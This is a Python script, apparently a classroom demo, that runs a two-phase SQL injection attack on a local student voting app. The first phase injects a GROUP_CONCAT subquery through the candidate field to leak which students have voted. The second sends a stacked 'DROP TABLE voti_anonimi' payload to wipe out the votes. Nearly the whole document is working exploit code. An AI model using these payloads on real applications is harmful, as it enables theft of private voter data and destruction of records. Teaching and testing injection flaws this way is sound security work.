import requests
import time

URL_VOTA = "http://localhost:3000/vota"
URL_RISULTATI = "http://localhost:3000/risultati"

# Dati di uno studente reale necessari per superare il primo controllo (il login)
identity = {
    "nome": "Sara",
    "cognome": "Verdi",
    "classe": "4B"
}

print("=== START SQL INJECTION ATTACK ===")

# --- FASE 1: INTERCETTAZIONE (Exfiltration) ---
# Obiettivo: Estrarre i nomi degli studenti che hanno già votato
# Usiamo una subquery: inseriamo un "voto" il cui nome è in realtà la lista degli studenti nel DB
print("\n[1] Fase Intercettazione: Estrazione lista votanti...")

leak_payload = "Hacker'), ((SELECT GROUP_CONCAT(nome || ' ' || cognome) FROM studenti WHERE ha_votato=1)); --"

data_leak = { **identity, "candidato": leak_payload }

try:
    res1 = requests.post(URL_VOTA, json=data_leak)
    print(f"[*] Payload inviato. Risposta server: {res1.json().get('message', 'Errore')}")

    # Controlliamo subito i risultati per vedere i dati "intercettati"
    time.sleep(1)
    res_results = requests.get(URL_RISULTATI).json()
    print("[!] DATI INTERCETTATI DALL'URNA:")
    for r in res_results:
        print(f"    - Trovato nel DB: {r['candidato']}")

except Exception as e:
    print(f"[-] Errore Fase 1: {e}")

# --- FASE 2: CANCELLAZIONE (Destruction) ---
# Obiettivo: Cancellare l'intera tabella dei voti per annullare le elezioni
# Nota: Poiché Sara ha già votato nel passaggio precedente, 
# in un sistema reale l'hacker dovrebbe usare un altro nome o bypassare il controllo.
# Qui assumiamo di voler distruggere tutto.
print("\n[2] Fase Distruzione: Cancellazione tabella voti...")

drop_payload = "Invisibile'); DROP TABLE voti_anonimi; --"

# Per la demo, il server ha già segnato Sara come 'ha_votato'. 
# Un vero hacker userebbe un SQLi anche nel login, ma qui usiamo un payload stacked:
data_drop = { **identity, "candidato": drop_payload }

try:
    res2 = requests.post(URL_VOTA, json=data_drop)
    print(f"[*] Payload distruttivo inviato.")

    # Verifica finale
    res_final = requests.get(URL_RISULTATI).json()
    if "error" in res_final:
        print(f"\n[SUCCESS] Attacco riuscito: {res_final['error']}")
    else:
        print("\n[-] Attacco fallito: la tabella esiste ancora.")

except Exception as e:
    print(f"[-] Errore Fase 2: {e}")